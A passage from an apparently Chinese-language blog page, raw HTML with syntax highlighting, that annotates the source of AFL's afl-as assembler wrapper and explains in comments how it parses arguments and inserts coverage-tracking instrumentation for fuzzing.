class="number">0</span>;      <span class="comment">// 32位模式</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">error</span> <span class="meta-string">&quot;Apple 32位平台不支持&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 参数处理函数：修改传递给真实汇编器的参数 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">edit_params</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">  u8 *tmp_dir = getenv(<span class="string">&quot;TMPDIR&quot;</span>), *afl_as = getenv(<span class="string">&quot;AFL_AS&quot;</span>);<span class="comment">//先检查环境变量，看是否可以直接获取路径</span></span><br><span class="line">  u32 i;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__</span></span><br><span class="line">  <span class="comment">// MacOS 特殊处理：优先使用 Clang 作为汇编器[3,8](@ref)</span></span><br><span class="line">  u8 use_clang_as = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (clang_mode &amp;&amp; !afl_as) &#123;</span><br><span class="line"></span><br><span class="line">    use_clang_as = <span class="number">1</span>;<span class="comment">//如果使用clang_mode,且环境变量中没有AFL_AS，则设置use_clang_as为1</span></span><br><span class="line"></span><br><span class="line">    afl_as = getenv(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!afl_as) afl_as = getenv(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!afl_as) afl_as = <span class="string">&quot;clang&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 确定临时目录</span></span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = getenv(<span class="string">&quot;TEMP&quot;</span>);<span class="comment">//如果之前通过TMPDIR没有找到，则查找TEMP环境变量</span></span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = getenv(<span class="string">&quot;TMP&quot;</span>);<span class="comment">//如果之前通过TEMP没有找到，则查找TMP环境变量</span></span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = <span class="string">&quot;/tmp&quot;</span>;<span class="comment">//如果之前通过TEP没有找到，则设置为&quot;/tmp&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  as_params = ck_alloc((argc + <span class="number">32</span>) * <span class="keyword">sizeof</span>(u8*)); <span class="comment">// 分配参数数组内存</span></span><br><span class="line">  as_params[<span class="number">0</span>] = afl_as ? afl_as : (u8*)<span class="string">&quot;as&quot;</span>;       <span class="comment">// 如果之前通过环境变量找到了afl_as，则令as_params[0]为afl_as，否则设置为as</span></span><br><span class="line">  as_params[argc] = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 处理传入参数</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; argc - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--64&quot;</span>)) use_64bit = <span class="number">1</span>;   <span class="comment">// 如果有参数 --64，6use_64bit设置为1</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--32&quot;</span>)) use_64bit = <span class="number">0</span>; <span class="comment">//  如果有参数 --32，use_64bit设置为0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__</span></span><br><span class="line">    <span class="comment">// 处理 MacOS 架构参数</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-arch&quot;</span>) &amp;&amp; i + <span class="number">1</span> &lt; argc) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i + <span class="number">1</span>], <span class="string">&quot;x86_64&quot;</span>)) use_64bit = <span class="number">1</span>;<span class="comment">//如果存在-arch x86_64，设置use_64bit为1</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i + <span class="number">1</span>], <span class="string">&quot;i386&quot;</span>))</span><br><span class="line">        FATAL(<span class="string">&quot;Sorry, 32-bit Apple platforms are not supported.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 过滤 Clang 特殊参数</span></span><br><span class="line">    <span class="keyword">if</span> (clang_mode &amp;&amp; (argv[i][<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span> &amp;&amp; (argv[i][<span class="number">1</span>] == <span class="string">&#x27;q&#x27;</span> || argv[i][<span class="number">1</span>] == <span class="string">&#x27;Q&#x27;</span>))) <span class="comment">//当apple环境下设置了clang模式，则跳过-q/-Q</span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    as_params[as_par_cnt++] = argv[i]; <span class="comment">// 添加有效参数</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__</span></span><br><span class="line">  <span class="comment">// MacOS Clang 模式，且没设置afl_as环境变量，设置必要参数</span></span><br><span class="line">  <span class="keyword">if</span> (use_clang_as) &#123;</span><br><span class="line">    as_params[as_par_cnt++] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">    as_params[as_par_cnt++] = <span class="string">&quot;-x&quot;</span>;</span><br><span class="line">    as_params[as_par_cnt++] = <span class="string">&quot;assembler&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 处理输入文件</span></span><br><span class="line">  input_file = argv[argc - <span class="number">1</span>];<span class="comment">//将最后一个参数作为input_argv</span></span><br><span class="line">  <span class="keyword">if</span> (input_file[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) &#123;  <span class="comment">// 处理特殊输入（如--version）</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(input_file + <span class="number">1</span>, <span class="string">&quot;-version&quot;</span>)) &#123;</span><br><span class="line">      just_version = <span class="number">1</span>;</span><br><span class="line">      modified_file = input_file;</span><br><span class="line">      <span class="keyword">goto</span> wrap_things_up;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (input_file[<span class="number">1</span>]) FATAL(<span class="string">&quot;Incorrect use (not called through afl-gcc?)&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span> input_file = <span class="literal">NULL</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 判断是否需要透传模式（非临时目录文件）</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strncmp</span>(input_file, tmp_dir, <span class="built_in">strlen</span>(tmp_dir)) &amp;&amp;</span><br><span class="line">        <span class="built_in">strncmp</span>(input_file, <span class="string">&quot;/var/tmp/&quot;</span>, <span class="number">9</span>) &amp;&amp;</span><br><span class="line">        <span class="built_in">strncmp</span>(input_file, <span class="string">&quot;/tmp/&quot;</span>, <span class="number">5</span>)) pass_thru = <span class="number">1</span>;<span class="comment">//比较input_file最前面几个字节和tmp_dir之前设置的路径或者/var/tmp/或者/tmp/相同，如果不相同，就设置pass_thru为1</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 生成临时输出文件名（格式：/tmp/.afl-pid-timestamp.s）</span></span><br><span class="line">  modified_file = alloc_printf(<span class="string">&quot;%s/.afl-%u-%u.s&quot;</span>, tmp_dir, getpid(), (u32)time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">wrap_things_up:</span><br><span class="line">  as_params[as_par_cnt++] = modified_file;  <span class="comment">// 添加最终输出文件参数</span></span><br><span class="line">  as_params[as_par_cnt] = <span class="literal">NULL</span>;             <span class="comment">// 参数数组终止符</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 插桩核心函数：在汇编代码中插入覆盖率追踪代码 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">add_instrumentation</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> u8 line[MAX_LINE];  <span class="comment">// 行缓冲区</span></span><br><span class="line">  <span class="comment">/* 输入/输出文件指针 */</span></span><br><span class="line">  FILE* inf;   <span class="comment">// 输入文件</span></span><br><span class="line">  FILE* outf;  <span class="comment">// 输出文件</span></span><br><span class="line">  s32 outfd;   <span class="comment">// 输出文件描述符</span></span><br><span class="line">  u32 ins_lines = <span class="number">0</span>;  <span class="comment">// 记录已插桩位置数量</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 状态标志</span></span><br><span class="line">  u8  instr_ok = <span class="number">0</span>,      <span class="comment">// 当前是否在.text段（可插桩区域）</span></span><br><span class="line">      skip_csect = <span class="number">0</span>,    <span class="comment">// 是否跳过当前代码段</span></span><br><span class="line">      skip_next_label = <span class="number">0</span>, <span class="comment">// 是否跳过下一个标签</span></span><br><span class="line">      skip_intel = <span class="number">0</span>,     <span class="comment">// 是否跳过Intel语法块</span></span><br><span class="line">      skip_app = <span class="number">0</span>,       <span class="comment">// 是否跳过#APP/#NO_APP块</span></span><br><span class="line">      instrument_next = <span class="number">0</span>; <span class="comment">// 是否对下一个标签插桩</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">  u8* colon_pos;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line">  <span class="comment">// 打开输入输出文件</span></span><br><span class="line">  <span class="keyword">if</span> (input_file) &#123;<span class="comment">//如果input_file存在</span></span><br><span class="line"></span><br><span class="line">    inf = fopen(input_file, <span class="string">&quot;r&quot;</span>);<span class="comment">//尝试打开input_file</span></span><br><span class="line">    <span class="keyword">if</span> (!inf) PFATAL(<span class="string">&quot;Unable to read &#x27;%s&#x27;&quot;</span>, input_file);<span class="comment">//如果打开失败，异常</span></span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> inf = <span class="built_in">stdin</span>;<span class="comment">//如果input_file不存在，则令inf为标准输入</span></span><br><span class="line"></span><br><span class="line">  outfd = open(modified_file, O_WRONLY | O_EXCL | O_CREAT, <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (outfd &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;Unable to write to &#x27;%s&#x27;&quot;</span>, modified_file);</span><br><span class="line"></span><br><span class="line">  outf = fdopen(outfd, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!outf) PFATAL(<span class="string">&quot;fdopen() failed&quot;</span>);<span class="comment">//文件描述符转换失败报错</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (fgets(line, MAX_LINE, inf)) &#123;<span class="comment">// 逐行处理汇编代码</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">/* ====== 延迟插桩检查点 ====== */</span></span><br><span class="line">    <span class="comment">/* 处理函数/标签后的第一条实际指令时插入桩代码 */</span></span><br><span class="line">    <span class="keyword">if</span> (!pass_thru &amp;&amp;                 <span class="comment">// 非透传模式</span></span><br><span class="line">        !skip_intel &amp;&amp;                <span class="comment">// 不在Intel语法块</span></span><br><span class="line">        !skip_app &amp;&amp;                  <span class="comment">// 不在APP/NO_APP块</span></span><br><span class="line">        !skip_csect &amp;&amp;                <span class="comment">// 在有效代码段</span></span><br><span class="line">        instr_ok &amp;&amp;                   <span class="comment">// 在.text段，后面代码会置位</span></span><br><span class="line">        instrument_next &amp;&amp;            <span class="comment">// 已标记需要插桩，后面代码会置位</span></span><br><span class="line">        line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp;           <span class="comment">// 行首是制表符</span></span><br><span class="line">        <span class="built_in">isalpha</span>(line[<span class="number">1</span>])) &#123;           <span class="comment">// 第二个字符是字母（指令）</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 根据架构选择32位或64位桩代码模板</span></span><br><span class="line">      <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">              R(MAP_SIZE));  <span class="comment">// 生成随机位置标识符</span></span><br><span class="line">      </span><br><span class="line">      instrument_next = <span class="number">0</span>;  <span class="comment">// 重置标记</span></span><br><span class="line">      ins_lines++;         <span class="comment">// 增加插桩计数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fputs</span>(line, outf);  <span class="comment">// 输出原始行</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (pass_thru) <span class="keyword">continue</span>;  <span class="comment">// 透传模式跳过后续处理</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * 段类型检测：识别.text段和其他数据段</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; line[<span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;<span class="comment">//行首是制表符，且后面一位是&#x27;.&#x27;,既各种段</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* OpenBSD跳转表特殊处理 */</span></span><br><span class="line">       <span class="keyword">if</span> (!clang_mode &amp;&amp;              <span class="comment">// 非clang模式</span></span><br><span class="line">          instr_ok &amp;&amp;                 <span class="comment">// 当前在代码段</span></span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;p2align &quot;</span>, <span class="number">8</span>) &amp;&amp;  <span class="comment">// 对齐指令</span></span><br><span class="line">          <span class="built_in">isdigit</span>(line[<span class="number">10</span>]) &amp;&amp;        <span class="comment">// 后跟数字</span></span><br><span class="line">          line[<span class="number">11</span>] == <span class="string">&#x27;\n&#x27;</span>) &#123;         <span class="comment">// 行结束</span></span><br><span class="line">        skip_next_label = <span class="number">1</span>;          <span class="comment">// 标记跳过下一个标签</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 检测.text段开始 */</span></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;text\n&quot;</span>, <span class="number">5</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t.text&quot;</span>, <span class="number">13</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t__TEXT,__text&quot;</span>, <span class="number">21</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section __TEXT,__text&quot;</span>, <span class="number">21</span>)) &#123;</span><br><span class="line">        instr_ok = <span class="number">1</span>;  <span class="comment">// 标记进入可插桩区域</span></span><br><span class="line">        <span class="keyword">continue</span>; </span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 检测非.text段（数据段/bss段） */</span></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t&quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section &quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;bss\n&quot;</span>, <span class="number">4</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;data\n&quot;</span>, <span class="number">5</span>)) &#123;</span><br><span class="line">        instr_ok = <span class="number">0</span>;  <span class="comment">// 标记离开可插桩区域</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 检测处理器指令集切换（.code32/.code64） */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code&quot;</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code32&quot;</span>)) skip_csect = use_64bit;   <span class="comment">// 64位模式跳过32位代码</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code64&quot;</span>)) skip_csect = !use_64bit;  <span class="comment">// 32位模式跳过64位代码</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 检测汇编语法切换（AT&amp;T/Intel） */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.intel_syntax&quot;</span>)) skip_intel = <span class="number">1</span>;  <span class="comment">// 跳过Intel语法块</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.att_syntax&quot;</span>)) skip_intel = <span class="number">0</span>;    <span class="comment">// 返回AT&amp;T语法</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 检测内联汇编块（#APP/#NO_APP） */</span></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">1</span>] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#APP&quot;</span>)) skip_app = <span class="number">1</span>;      <span class="comment">// 进入内联汇编块</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#NO_APP&quot;</span>)) skip_app = <span class="number">0</span>;   <span class="comment">// 离开内联汇编块</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * 插桩点检测：跳过以下情况：</span></span><br><span class="line"><span class="comment">     * 1. Intel语法块 2. 内联汇编块 3. 非.text段 4. 注释行</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (skip_intel || skip_app || skip_csect || !instr_ok ||</span><br><span class="line">        line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">0</span>] == <span class="string">&#x27; &#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 条件分支指令检测（如jnz/jbe等） */</span></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span>) &#123;</span><br><span class="line">      <span class="comment">/* 检测条件跳转（非jmp指令） */</span></span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">1</span>] == <span class="string">&#x27;j&#x27;</span> &amp;&amp; line[<span class="number">2</span>] != <span class="string">&#x27;m&#x27;</span> &amp;&amp; R(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line">        <span class="comment">/* 插入桩代码 */</span></span><br><span class="line">        <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">                R(MAP_SIZE));</span><br><span class="line">        ins_lines++;  <span class="comment">// 增加插桩计数</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 标签处理（函数入口/分支标签） */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__</span></span><br><span class="line">    <span class="comment">/* macOS标签格式：L&lt;label&gt;: */</span></span><br><span class="line">    <span class="keyword">if</span> ((colon_pos = <span class="built_in">strstr</span>(line, <span class="string">&quot;:&quot;</span>))) &#123;</span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;L&#x27;</span> &amp;&amp; <span class="built_in">isdigit</span>(*(colon_pos - <span class="number">1</span>))) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="comment">/* 标准标签格式：.L&lt;label&gt;: */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;:&quot;</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line">        <span class="comment">/* 分支目标标签处理（如.L0:/LBB0_0:） */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__</span></span><br><span class="line">        <span class="comment">/* macOS分支标签：L&lt;num&gt; 或 LBB&lt;num&gt; */</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">isdigit</span>(line[<span class="number">1</span>]) || (clang_mode &amp;&amp; !<span class="built_in">strncmp</span>(line, <span class="string">&quot;LBB&quot;</span>, <span class="number">3</span>)))</span><br><span class="line">            &amp;&amp; R(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">        <span class="comment">/* 标准分支标签：.L&lt;num&gt; 或 .LBB&lt;num&gt; */</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">isdigit</span>(line[<span class="number">2</span>]) || (clang_mode &amp;&amp; !<span class="built_in">strncmp</span>(line + <span class="number">1</span>, <span class="string">&quot;LBB&quot;</span>, <span class="number">3</span>)))</span><br><span class="line">            &amp;&amp; R(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line">          <span class="comment">/* 设置延迟插桩标志（避免破坏异常处理） */</span></span><br><span class="line">          <span class="keyword">if</span> (!skip_next_label) instrument_next = <span class="number">1</span>; </span><br><span class="line">          <span class="keyword">else</span> skip_next_label = <span class="number">0</span>;  <span class="comment">// 重置OpenBSD跳转表标志</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* 函数入口标签（始终插桩） */</span></span><br><span class="line">        instrument_next = <span class="number">1</span>;  <span class="comment">// 标记下一个标签需要插桩</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;  <span class="comment">// 结束文件遍历</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 插入主插桩逻辑（覆盖率跟踪等） */</span></span><br><span class="line">  <span class="keyword">if</span> (ins_lines)</span><br><span class="line">    <span class="built_in">fputs</span>(use_64bit ? main_payload_64 : main_payload_32, outf);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 清理资源：关闭文件 */</span></span><br><span class="line">  <span class="keyword">if</span> (input_file) fclose(inf);</span><br><span class="line">  fclose(outf);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 输出插桩统计信息 */</span></span><br><span class="line">  <span class="keyword">if</span> (!be_quiet) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!ins_lines) WARNF(<span class="string">&quot;No instrumentation targets found%s.&quot;</span>,</span><br><span class="line">                          pass_thru ? <span class="string">&quot; (pass-thru mode)&quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> OKF(<span class="string">&quot;Instrumented %u locations (%s-bit, %s mode, ratio %u%%).&quot;</span>,</span><br><span class="line">             ins_lines, use_64bit ? <span class="string">&quot;64&quot;</span> : <span class="string">&quot;32&quot;</span>,</span><br><span class="line">             getenv(<span class="string">&quot;AFL_HARDEN&quot;</span>) ? <span class="string">&quot;hardened&quot;</span> : </span><br><span class="line">             (sanitizer ? <span class="string">&quot;ASAN/MSAN&quot;</span> : <span class="string">&quot;non-hardened&quot;</span>),</span><br><span class="line">             inst_ratio);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  s32 pid;               <span class="comment">// 子进程ID</span></span><br><span class="line">  u32 rand_seed;         <span class="comment">// 随机数种子</span></span><br><span class="line">  <span class="keyword">int</span> status;            <span class="comment">// 子进程退出状态</span></span><br><span class="line">  u8* inst_ratio_str = getenv(<span class="string">&quot;AFL_INST_RATIO&quot;</span>);  <span class="comment">// 获取环境变量中的插桩比例</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span>     <span class="comment">// 时间结构（用于生成随机种子）</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timezone</span> <span class="title">tz</span>;</span></span><br><span class="line"></span><br><span class="line">  clang_mode = !!getenv(CLANG_ENV_VAR);  <span class="comment">// 检测是否在Clang模式下运行</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 初始化输出设置 */</span></span><br><span class="line">  <span class="keyword">if</span> (isatty(<span class="number">2</span>) &amp;&amp; !getenv(<span class="string">&quot;AFL_QUIET&quot;</span>)) &#123;  <span class="comment">// 如果标准错误是终端且未设置静默模式</span></span><br><span class="line">    SAYF(cCYA <span class="string">&quot;afl-as &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);  <span class="comment">// 显示版本信息</span></span><br><span class="line">  &#125; <span class="keyword">else</span> be_quiet = <span class="number">1</span>;  <span class="comment">// 否则设置为静默模式</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 参数检查：必须至少有一个参数（输入文件） */</span></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="comment">// 显示使用说明（用户直接运行时）</span></span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This is a helper application for afl-fuzz. It is a wrapper around GNU &#x27;as&#x27;,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;executed by the toolchain whenever using afl-gcc or afl-clang. You probably\n&quot;</span></span><br><span class="line">         <span class="string">&quot;don&#x27;t want to run this program directly.\n\n&quot;</span></span><br><span class="line">         <span class="string">&quot;Rarely, when dealing with extremely complex projects, it may be advisable to\n&quot;</span></span><br><span class="line">         <span class="string">&quot;set AFL_INST_RATIO to a value less than 100 in order to reduce the odds of\n&quot;</span></span><br><span class="line">         <span class="string">&quot;instrumenting every discovered branch.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 生成随机数种子 */</span></span><br><span class="line">  gettimeofday(&amp;tv, &amp;tz);  <span class="comment">// 获取当前时间</span></span><br><span class="line">  rand_seed = tv.tv_sec ^ tv.tv_usec ^ getpid();  <span class="comment">// 混合时间戳和进程ID</span></span><br><span class="line">  srandom(rand_seed);      <span class="comment">// 初始化随机数生成器</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 处理编译参数 */</span></span><br><span class="line">  edit_params(argc, argv);  <span class="comment">// 修改as的参数并设置输入/输出文件路径</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 处理插桩比例设置 */</span></span><br><span class="line">  <span class="keyword">if</span> (inst_ratio_str) &#123;  <span class="comment">// 如果设置了AFL_INST_RATIO环境变量</span></span><br><span class="line">    <span class="comment">// 解析并验证插桩比例（0-100）</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sscanf</span>(inst_ratio_str, <span class="string">&quot;%u&quot;</span>, &amp;inst_ratio) != <span class="number">1</span> || inst_ratio &gt; <span class="number">100</span>) </span><br><span class="line">      FATAL(<span class="string">&quot;Bad value of AFL_INST_RATIO (must be between 0 and 100)&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 安全检查：防止无限递归调用 */</span></span><br><span class="line">  <span class="keyword">if</span> (getenv(AS_LOOP_ENV_VAR))  <span class="comment">// 如果检测到循环调用标志</span></span><br><span class="line">    FATAL(<span class="string">&quot;Endless loop when calling &#x27;as&#x27; (remove &#x27;.&#x27; from your PATH)&quot;</span>);</span><br><span class="line">  setenv(AS_LOOP_ENV_VAR, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);  <span class="comment">// 设置标志防止递归</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 处理ASAN/MSAN模式 */</span></span><br><span class="line">  <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_USE_ASAN&quot;</span>) || getenv(<span class="string">&quot;AFL_USE_MSAN&quot;</span>)) &#123;</span><br><span class="line">    sanitizer = <span class="number">1</span>;         <span class="comment">// 标记为sanitizer模式</span></span><br><span class="line">    